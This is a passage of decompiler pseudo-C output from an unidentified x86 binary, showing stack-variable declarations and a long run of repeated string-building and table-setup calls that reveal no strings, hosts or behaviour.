in_stack_fffff9a8;\n    uint in_stack_fffff9ac;\n    uint in_stack_fffff9b0;\n    uint in_stack_fffff9b4;\n    uint in_stack_fffff9b8;\n    uint in_stack_fffff9bc;\n    uint in_stack_fffff9c8;\n    uint in_stack_fffff9cc;\n    uint in_stack_fffff9d0;\n    uint in_stack_fffff9d4;\n    uint in_stack_fffff9d8;\n    uint in_stack_fffff9dc;\n    uint in_stack_fffff9f0;\n    uint in_stack_fffff9f4;\n    uint in_stack_fffff9f8;\n    uint in_stack_fffff9fc;\n    uint in_stack_fffffa00;\n    uint in_stack_fffffa04;\n    uint in_stack_fffffa10;\n    uint in_stack_fffffa14;\n    uint in_stack_fffffa18;\n    uint in_stack_fffffa1c;\n    uint in_stack_fffffa20;\n    uint in_stack_fffffa24;\n    uint in_stack_fffffa30;\n    uint in_stack_fffffa34;\n    uint in_stack_fffffa38;\n    uint in_stack_fffffa3c;\n    uint in_stack_fffffa40;\n    uint in_stack_fffffa44;\n    uint in_stack_fffffa58;\n    uint in_stack_fffffa5c;\n    uint in_stack_fffffa60;\n    uint in_stack_fffffa64;\n    uint in_stack_fffffa68;\n    uint in_stack_fffffa6c;\n    uint in_stack_fffffa78;\n    uint in_stack_fffffa7c;\n    uint in_stack_fffffa80;\n    uint in_stack_fffffa84;\n    uint in_stack_fffffa88;\n    uint in_stack_fffffa8c;\n    uint in_stack_fffffa98;\n    uint in_stack_fffffa9c;\n    uint in_stack_fffffaa0;\n    uint in_stack_fffffaa4;\n    uint in_stack_fffffaa8;\n    uint in_stack_fffffaac;\n    uint in_stack_fffffac0;\n    uint in_stack_fffffac4;\n    uint in_stack_fffffac8;\n    uint in_stack_fffffacc;\n    uint in_stack_fffffad0;\n    uint in_stack_fffffad4;\n    uint in_stack_fffffae0;\n    uint in_stack_fffffae4;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint in_stack_fffffb08;\n    uint in_stack_fffffb0c;\n    uint in_stack_fffffb10;\n    uint in_stack_fffffb14;\n    uint in_stack_fffffb28;\n    uint in_stack_fffffb2c;\n    uint in_stack_fffffb30;\n    uint in_stack_fffffb34;\n    uint in_stack_fffffb38;\n    uint in_stack_fffffb3c;\n    uint in_stack_fffffb48;\n    uint in_stack_fffffb4c;\n    uint in_stack_fffffb50;\n    uint in_stack_fffffb54;\n    uint in_stack_fffffb58;\n    uint in_stack_fffffb5c;\n    uint32_t in_stack_fffffb68;\n    uint in_stack_fffffb6c;\n    uint in_stack_fffffb70;\n    uint in_stack_fffffb74;\n    uint in_stack_fffffb90;\n    uint in_stack_fffffb94;\n    uint in_stack_fffffb98;\n    uint in_stack_fffffb9c;\n    uint in_stack_fffffba0;\n    uint in_stack_fffffba4;\n    uint in_stack_fffffbb0;\n    uint in_stack_fffffbb4;\n    uint in_stack_fffffbb8;\n    uint in_stack_fffffbbc;\n    uint in_stack_fffffbc0;\n    uint in_stack_fffffbc4;\n    uint in_stack_fffffbd0;\n    uint in_stack_fffffbd4;\n    uint in_stack_fffffbd8;\n    uint in_stack_fffffbdc;\n    uint in_stack_fffffbe0;\n    uint in_stack_fffffbe4;\n    uint in_stack_fffffbf8;\n    uint in_stack_fffffbfc;\n    uint in_stack_fffffc00;\n    uint in_stack_fffffc04;\n    uint in_stack_fffffc08;\n    uint in_stack_fffffc0c;\n    uint in_stack_fffffc18;\n    uint in_stack_fffffc1c;\n    uint in_stack_fffffc20;\n    uint in_stack_fffffc24;\n    uint in_stack_fffffc28;\n    uint in_stack_fffffc2c;\n    uint in_stack_fffffc38;\n    uint in_stack_fffffc3c;\n    uint in_stack_fffffc40;\n    uint in_stack_fffffc44;\n    uint in_stack_fffffc48;\n    uint in_stack_fffffc4c;\n    uint in_stack_fffffc60;\n    uint in_stack_fffffc64;\n    uint in_stack_fffffc68;\n    uint in_stack_fffffc6c;\n    uint in_stack_fffffc70;\n    uint in_stack_fffffc74;\n    uint in_stack_fffffc80;\n    uint in_stack_fffffc84;\n    uint in_stack_fffffc88;\n    uint in_stack_fffffc8c;\n    uint in_stack_fffffc90;\n    uint in_stack_fffffc94;\n    uint in_stack_fffffca0;\n    uint in_stack_fffffca4;\n    uint in_stack_fffffca8;\n    uint in_stack_fffffcac;\n    uint in_stack_fffffcb0;\n    uint in_stack_fffffcb4;\n    uint in_stack_fffffcc8;\n    uint in_stack_fffffccc;\n    uint in_stack_fffffcd0;\n    uint in_stack_fffffcd4;\n    uint in_stack_fffffcd8;\n    uint in_stack_fffffcdc;\n    uint in_stack_fffffce8;\n    uint in_stack_fffffcec;\n    uint in_stack_fffffcf0;\n    uint in_stack_fffffcf4;\n    uint in_stack_fffffcf8;\n    uint in_stack_fffffcfc;\n    uint in_stack_fffffd08;\n    uint in_stack_fffffd0c;\n    uint in_stack_fffffd10;\n    uint in_stack_fffffd14;\n    uint in_stack_fffffd18;\n    uint in_stack_fffffd1c;\n    uint in_stack_fffffd30;\n    uint in_stack_fffffd34;\n    uint in_stack_fffffd38;\n    uint in_stack_fffffd3c;\n    uint in_stack_fffffd40;\n    uint in_stack_fffffd44;\n    uint in_stack_fffffd50;\n    uint in_stack_fffffd54;\n    uint in_stack_fffffd58;\n    uint in_stack_fffffd5c;\n    uint in_stack_fffffd60;\n    uint in_stack_fffffd64;\n    uint in_stack_fffffd70;\n    uint in_stack_fffffd74;\n    uint in_stack_fffffd78;\n    uint in_stack_fffffd7c;\n    uint in_stack_fffffd80;\n    uint in_stack_fffffd84;\n    uint in_stack_fffffd98;\n    uint in_stack_fffffd9c;\n    uint in_stack_fffffda0;\n    uint in_stack_fffffda4;\n    uint in_stack_fffffda8;\n    uint in_stack_fffffdac;\n    uint in_stack_fffffdb8;\n    uint in_stack_fffffdbc;\n    uint in_stack_fffffdc0;\n    uint in_stack_fffffdc4;\n    uint in_stack_fffffdc8;\n    uint in_stack_fffffdcc;\n    uint in_stack_fffffdd8;\n    uint in_stack_fffffddc;\n    uint in_stack_fffffde0;\n    uint in_stack_fffffde4;\n    uint in_stack_fffffde8;\n    uint in_stack_fffffdec;\n    uint in_stack_fffffe00;\n    uint in_stack_fffffe04;\n    uint in_stack_fffffe08;\n    uint in_stack_fffffe0c;\n    uint in_stack_fffffe10;\n    uint in_stack_fffffe14;\n    uint in_stack_fffffe20;\n    uint in_stack_fffffe24;\n    uint in_stack_fffffe28;\n    uint in_stack_fffffe2c;\n    uint in_stack_fffffe30;\n    uint in_stack_fffffe34;\n    uint in_stack_fffffe40;\n    uint in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint in_stack_fffffe4c;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe54;\n    uint in_stack_fffffe68;\n    uint in_stack_fffffe6c;\n    uint in_stack_fffffe70;\n    uint in_stack_fffffe74;\n    uint in_stack_fffffe78;\n    uint in_stack_fffffe7c;\n    uint in_stack_fffffe88;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint in_stack_fffffe9c;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    uint in_stack_fffffee0;\n    uint in_stack_fffffee4;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint32_t in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint in_stack_ffffff18;\n    uint in_stack_ffffff1c;\n    uint uVar5;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint uVar6;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint32_t in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint in_stack_ffffffa0;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint uVar10;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint uVar11;\n    uint in_stack_ffffffe0;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint in_stack_fffffff0;\n    uint in_stack_fffffff4;\n    uint var_4h_78;\n    \n    fcn.00420895();\n    uVar2 = *0x446274;\n    *(unaff_EBP + -0x10) = &stack0xffffffe0;\n    uVar1 = *0x445d0c;\n    *(unaff_ESI + 0x1c) = 0;\n    *(unaff_ESI + 0x20) = uVar2;\n    uVar11 = 0x40cb66;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x14) = &stack0xffffffc0;\n    uVar10 = 0x40cb7c;\n    uVar6 = *0x445cb8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x18) = &stack0xffffffa0;\n    uVar2 = *0x445ee0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar9 = 0x40cb9e;\n    fcn.0040c3cb(unaff_ESI, 0, uVar2, in_stack_ffffffa0, in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, \n                 in_stack_ffffffb0, in_stack_ffffffb4, uVar10, uVar6, in_stack_ffffffc0, in_stack_ffffffc4, \n                 in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, in_stack_ffffffd4, uVar11, uVar1, \n                 in_stack_ffffffe0, in_stack_ffffffe4, in_stack_ffffffe8, in_stack_ffffffec, in_stack_fffffff0, \n                 in_stack_fffffff4, 0x40cb46);\n    *(unaff_EBP + -0x18) = &stack0xffffff78;\n    uVar8 = 0xf;\n    uVar7 = 0;\n    uVar11 = 0x43e200;\n    in_stack_ffffff78 = in_stack_ffffff78 & 0xffffff00;\n    uVar10 = 0x40cbbb;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x14) = &stack0xffffff58;\n    uVar6 = 0x40cbd5;\n    uVar2 = *0x445de8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 3;\n    *(unaff_EBP + -0x10) = &stack0xffffff38;\n    uVar1 = *0x445eb0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar5 = 0x40cbf7;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, in_stack_ffffff44, \n                 in_stack_ffffff48, in_stack_ffffff4c, uVar6, uVar2, in_stack_ffffff58, in_stack_ffffff5c, \n                 in_stack_ffffff60, in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, uVar10, uVar11, \n                 in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, uVar7, uVar8, uVar9);\n    *(unaff_EBP + -0x18) = &stack0xffffff10;\n    uVar9 = 0xf;\n    uVar7 = 0;\n    uVar11 = 0x43e200;\n    in_stack_ffffff10 = in_stack_ffffff10 & 0xffffff00;\n    uVar10 = 0x40cc11;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 4;\n    *(unaff_EBP + -0x14) = &stack0xfffffef0;\n    uVar6 = 0x40cc2b;\n    uVar2 = *0x445ca4;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 5;\n    *(unaff_EBP + -0x10) = &stack0xfffffed0;\n    uVar1 = *0x445c8c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40cc4d;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffed0, in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc, \n                 in_stack_fffffee0, in_stack_fffffee4, uVar6, uVar2, in_stack_fffffef0, in_stack_fffffef4, \n                 in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00, in_stack_ffffff04, uVar10, uVar11, \n                 in_stack_ffffff10, in_stack_ffffff14, in_stack_ffffff18, in_stack_ffffff1c, uVar7, uVar9, uVar5);\n    *(unaff_EBP + -0x18) = &stack0xfffffea8;\n    uVar11 = 0x40cc60;\n    uVar6 = *0x446150;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 6;\n    *(unaff_EBP + -0x14) = &stack0xfffffe88;\n    uVar10 = 0x40cc7a;\n    uVar2 = *0x445c00;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 7;\n    *(unaff_EBP + -0x10) = &stack0xfffffe68;\n    uVar1 = *0x446048;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40cc9c;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffe68, in_stack_fffffe6c, in_stack_fffffe70, in_stack_fffffe74, \n                 in_stack_fffffe78, in_stack_fffffe7c, uVar10, uVar2, in_stack_fffffe88, in_stack_fffffe8c, \n                 in_stack_fffffe90, in_stack_fffffe94, in_stack_fffffe98, in_stack_fffffe9c, uVar11, uVar6, \n                 in_stack_fffffea8, in_stack_fffffeac, in_stack_fffffeb0, in_stack_fffffeb4, in_stack_fffffeb8, \n                 in_stack_fffffebc, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffffe40;\n    uVar11 = 0x40ccaf;\n    uVar6 = *0x445dc4;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 8;\n    *(unaff_EBP + -0x14) = &stack0xfffffe20;\n    uVar10 = 0x40ccc9;\n    uVar2 = *0x445c00;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 9;\n    *(unaff_EBP + -0x10) = &stack0xfffffe00;\n    uVar1 = *0x446048;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40cceb;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffe00, in_stack_fffffe04, in_stack_fffffe08, in_stack_fffffe0c, \n                 in_stack_fffffe10, in_stack_fffffe14, uVar10, uVar2, in_stack_fffffe20, in_stack_fffffe24, \n                 in_stack_fffffe28, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, uVar11, uVar6, \n                 in_stack_fffffe40, in_stack_fffffe44, in_stack_fffffe48, in_stack_fffffe4c, in_stack_fffffe50, \n                 in_stack_fffffe54, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffffdd8;\n    uVar11 = 0x40ccfe;\n    uVar6 = *0x445ef4;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 10;\n    *(unaff_EBP + -0x14) = &stack0xfffffdb8;\n    uVar10 = 0x40cd18;\n    uVar2 = *0x445c00;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xb;\n    *(unaff_EBP + -0x10) = &stack0xfffffd98;\n    uVar1 = *0x445c1c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40cd3a;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffd98, in_stack_fffffd9c, in_stack_fffffda0, in_stack_fffffda4, \n                 in_stack_fffffda8, in_stack_fffffdac, uVar10, uVar2, in_stack_fffffdb8, in_stack_fffffdbc, \n                 in_stack_fffffdc0, in_stack_fffffdc4, in_stack_fffffdc8, in_stack_fffffdcc, uVar11, uVar6, \n                 in_stack_fffffdd8, in_stack_fffffddc, in_stack_fffffde0, in_stack_fffffde4, in_stack_fffffde8, \n                 in_stack_fffffdec, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffffd70;\n    uVar11 = 0x40cd4d;\n    uVar6 = *0x446104;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xc;\n    *(unaff_EBP + -0x14) = &stack0xfffffd50;\n    uVar10 = 0x40cd67;\n    uVar2 = *0x445c00;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xd;\n    *(unaff_EBP + -0x10) = &stack0xfffffd30;\n    uVar1 = *0x445c1c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40cd89;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffd30, in_stack_fffffd34, in_stack_fffffd38, in_stack_fffffd3c, \n                 in_stack_fffffd40, in_stack_fffffd44, uVar10, uVar2, in_stack_fffffd50, in_stack_fffffd54, \n                 in_stack_fffffd58, in_stack_fffffd5c, in_stack_fffffd60, in_stack_fffffd64, uVar11, uVar6, \n                 in_stack_fffffd70, in_stack_fffffd74, in_stack_fffffd78, in_stack_fffffd7c, in_stack_fffffd80, \n                 in_stack_fffffd84, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffffd08;\n    uVar11 = 0x40cd9c;\n    uVar6 = *0x446124;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xe;\n    *(unaff_EBP + -0x14) = &stack0xfffffce8;\n    uVar10 = 0x40cdb6;\n    uVar2 = *0x445c00;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xf;\n    *(unaff_EBP + -0x10) = &stack0xfffffcc8;\n    uVar1 = *0x445c1c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40cdd8;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffcc8, in_stack_fffffccc, in_stack_fffffcd0, in_stack_fffffcd4, \n                 in_stack_fffffcd8, in_stack_fffffcdc, uVar10, uVar2, in_stack_fffffce8, in_stack_fffffcec, \n                 in_stack_fffffcf0, in_stack_fffffcf4, in_stack_fffffcf8, in_stack_fffffcfc, uVar11, uVar6, \n                 in_stack_fffffd08, in_stack_fffffd0c, in_stack_fffffd10, in_stack_fffffd14, in_stack_fffffd18, \n                 in_stack_fffffd1c, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffffca0;\n    uVar11 = 0x40cdeb;\n    uVar6 = *0x4460ec;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x10;\n    *(unaff_EBP + -0x14) = &stack0xfffffc80;\n    uVar10 = 0x40ce05;\n    uVar2 = *0x446134;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x11;\n    *(unaff_EBP + -0x10) = &stack0xfffffc60;\n    uVar1 = *0x445fc0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40ce27;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffc60, in_stack_fffffc64, in_stack_fffffc68, in_stack_fffffc6c, \n                 in_stack_fffffc70, in_stack_fffffc74, uVar10, uVar2, in_stack_fffffc80, in_stack_fffffc84, \n                 in_stack_fffffc88, in_stack_fffffc8c, in_stack_fffffc90, in_stack_fffffc94, uVar11, uVar6, \n                 in_stack_fffffca0, in_stack_fffffca4, in_stack_fffffca8, in_stack_fffffcac, in_stack_fffffcb0, \n                 in_stack_fffffcb4, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffffc38;\n    uVar11 = 0x40ce3a;\n    uVar6 = *0x445fac;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x12;\n    *(unaff_EBP + -0x14) = &stack0xfffffc18;\n    uVar10 = 0x40ce54;\n    uVar2 = *0x4461d4;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x13;\n    *(unaff_EBP + -0x10) = &stack0xfffffbf8;\n    uVar1 = *0x445d38;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40ce76;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffbf8, in_stack_fffffbfc, in_stack_fffffc00, in_stack_fffffc04, \n                 in_stack_fffffc08, in_stack_fffffc0c, uVar10, uVar2, in_stack_fffffc18, in_stack_fffffc1c, \n                 in_stack_fffffc20, in_stack_fffffc24, in_stack_fffffc28, in_stack_fffffc2c, uVar11, uVar6, \n                 in_stack_fffffc38, in_stack_fffffc3c, in_stack_fffffc40, in_stack_fffffc44, in_stack_fffffc48, \n                 in_stack_fffffc4c, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffffbd0;\n    uVar11 = 0x40ce89;\n    uVar6 = *0x445bc8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x14;\n    *(unaff_EBP + -0x14) = &stack0xfffffbb0;\n    uVar10 = 0x40cea3;\n    uVar2 = *0x445e9c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x15;\n    *(unaff_EBP + -0x10) = &stack0xfffffb90;\n    uVar1 = *0x4460d4;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar5 = 0x40cec5;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffb90, in_stack_fffffb94, in_stack_fffffb98, in_stack_fffffb9c, \n                 in_stack_fffffba0, in_stack_fffffba4, uVar10, uVar2, in_stack_fffffbb0, in_stack_fffffbb4, \n                 in_stack_fffffbb8, in_stack_fffffbbc, in_stack_fffffbc0, in_stack_fffffbc4, uVar11, uVar6, \n                 in_stack_fffffbd0, in_stack_fffffbd4, in_stack_fffffbd8, in_stack_fffffbdc, in_stack_fffffbe0, \n                 in_stack_fffffbe4, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffffb68;\n    uVar9 = 0xf;\n    uVar7 = 0;\n    uVar11 = 0x43e200;\n    in_stack_fffffb68 = in_stack_fffffb68 & 0xffffff00;\n    uVar10 = 0x40cedf;\n    fcn.00403f50();\n    *(unaff_EBP + -4) = 0x16;\n    *(unaff_EBP + -0x14) = &stack0xfffffb48;\n    uVar6 = 0x40cef9;\n    uVar2 = *0x445af8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x17;\n    *(unaff_EBP + -0x10) = &stack0xfffffb28;\n    uVar1 = *0x446184;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40cf1b;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffb28, in_stack_fffffb2c, in_stack_fffffb30, in_stack_fffffb34, \n                 in_stack_fffffb38, in_stack_fffffb3c, uVar6, uVar2, in_stack_fffffb48, in_stack_fffffb4c, \n                 in_stack_fffffb50, in_stack_fffffb54, in_stack_fffffb58, in_stack_fffffb5c, uVar10, uVar11, \n                 in_stack_fffffb68, in_stack_fffffb6c, in_stack_fffffb70, in_stack_fffffb74, uVar7, uVar9, uVar5);\n    *(unaff_EBP + -0x18) = &stack0xfffffb00;\n    uVar11 = 0x40cf2e;\n    uVar6 = *0x446120;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x18;\n    *(unaff_EBP + -0x14) = &stack0xfffffae0;\n    uVar10 = 0x40cf48;\n    uVar2 = *0x445d64;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x19;\n    *(unaff_EBP + -0x10) = &stack0xfffffac0;\n    uVar1 = *0x445bbc;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40cf6a;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffac0, in_stack_fffffac4, in_stack_fffffac8, in_stack_fffffacc, \n                 in_stack_fffffad0, in_stack_fffffad4, uVar10, uVar2, in_stack_fffffae0, in_stack_fffffae4, \n                 in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, uVar11, uVar6, \n                 in_stack_fffffb00, in_stack_fffffb04, in_stack_fffffb08, in_stack_fffffb0c, in_stack_fffffb10, \n                 in_stack_fffffb14, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffffa98;\n    uVar11 = 0x40cf7d;\n    uVar6 = *0x445a78;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x1a;\n    *(unaff_EBP + -0x14) = &stack0xfffffa78;\n    uVar10 = 0x40cf97;\n    uVar2 = *0x445d64;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x1b;\n    *(unaff_EBP + -0x10) = &stack0xfffffa58;\n    uVar1 = *0x445bbc;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40cfb9;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffffa58, in_stack_fffffa5c, in_stack_fffffa60, in_stack_fffffa64, \n                 in_stack_fffffa68, in_stack_fffffa6c, uVar10, uVar2, in_stack_fffffa78, in_stack_fffffa7c, \n                 in_stack_fffffa80, in_stack_fffffa84, in_stack_fffffa88, in_stack_fffffa8c, uVar11, uVar6, \n                 in_stack_fffffa98, in_stack_fffffa9c, in_stack_fffffaa0, in_stack_fffffaa4, in_stack_fffffaa8, \n                 in_stack_fffffaac, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffffa30;\n    uVar11 = 0x40cfcc;\n    uVar6 = *0x445b5c;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x1c;\n    *(unaff_EBP + -0x14) = &stack0xfffffa10;\n    uVar10 = 0x40cfe6;\n    uVar2 = *0x445d64;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x1d;\n    *(unaff_EBP + -0x10) = &stack0xfffff9f0;\n    uVar1 = *0x445bbc;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40d008;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff9f0, in_stack_fffff9f4, in_stack_fffff9f8, in_stack_fffff9fc, \n                 in_stack_fffffa00, in_stack_fffffa04, uVar10, uVar2, in_stack_fffffa10, in_stack_fffffa14, \n                 in_stack_fffffa18, in_stack_fffffa1c, in_stack_fffffa20, in_stack_fffffa24, uVar11, uVar6, \n                 in_stack_fffffa30, in_stack_fffffa34, in_stack_fffffa38, in_stack_fffffa3c, in_stack_fffffa40, \n                 in_stack_fffffa44, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffff9c8;\n    uVar11 = 0x40d01b;\n    uVar6 = *0x445fd8;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x1e;\n    *(unaff_EBP + -0x14) = &stack0xfffff9a8;\n    uVar10 = 0x40d035;\n    uVar2 = *0x445d64;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x1f;\n    *(unaff_EBP + -0x10) = &stack0xfffff988;\n    uVar1 = *0x445bbc;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40d057;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff988, in_stack_fffff98c, in_stack_fffff990, in_stack_fffff994, \n                 in_stack_fffff998, in_stack_fffff99c, uVar10, uVar2, in_stack_fffff9a8, in_stack_fffff9ac, \n                 in_stack_fffff9b0, in_stack_fffff9b4, in_stack_fffff9b8, in_stack_fffff9bc, uVar11, uVar6, \n                 in_stack_fffff9c8, in_stack_fffff9cc, in_stack_fffff9d0, in_stack_fffff9d4, in_stack_fffff9d8, \n                 in_stack_fffff9dc, uVar7);\n    *(unaff_EBP + -0x18) = &stack0xfffff960;\n    uVar11 = 0x40d06a;\n    uVar6 = *0x445c10;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x20;\n    *(unaff_EBP + -0x14) = &stack0xfffff940;\n    uVar10 = 0x40d084;\n    uVar2 = *0x445d64;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x21;\n    *(unaff_EBP + -0x10) = &stack0xfffff920;\n    uVar1 = *0x445bbc;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar7 = 0x40d0a6;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff920, in_stack_fffff924, in_stack_fffff928, in_stack_fffff92c, \n                 in_stack_fffff930, in_stack_fffff934, uVar10, uVar2, in_stack_fffff940, in_stack_fffff944, \n                 in_stack_fffff948, in_stack_fffff94c, in_stack_fffff950, in_stack_fffff954, uVar11, uVar6, \n                 in_stack_fffff960, in_stack_fffff964, in_stack_fffff968, in_stack_fffff96c, in_stack_fffff970, \n                 in_stack_fffff974, uVar8);\n    *(unaff_EBP + -0x18) = &stack0xfffff8f8;\n    uVar11 = 0x40d0b9;\n    uVar6 = *0x445df0;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x22;\n    *(unaff_EBP + -0x14) = &stack0xfffff8d8;\n    uVar10 = 0x40d0d3;\n    uVar2 = *0x445d64;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0x23;\n    *(unaff_EBP + -0x10) = &stack0xfffff8b8;\n    uVar1 = *0x445bbc;\n    fcn.00403ed2();\n    *(unaff_EBP + -4) = 0xffffffff;\n    uVar8 = 0x40d0f5;\n    fcn.0040c3cb(unaff_ESI, 0, uVar1, in_stack_fffff8b8, in_stack_fffff8bc, in_stack_fffff8c0, in_stack_fffff8c4, \n                 in_stack_fffff8c8, in_stack_fffff8cc, uVar10, uVar2, in_stack_fffff8d8, 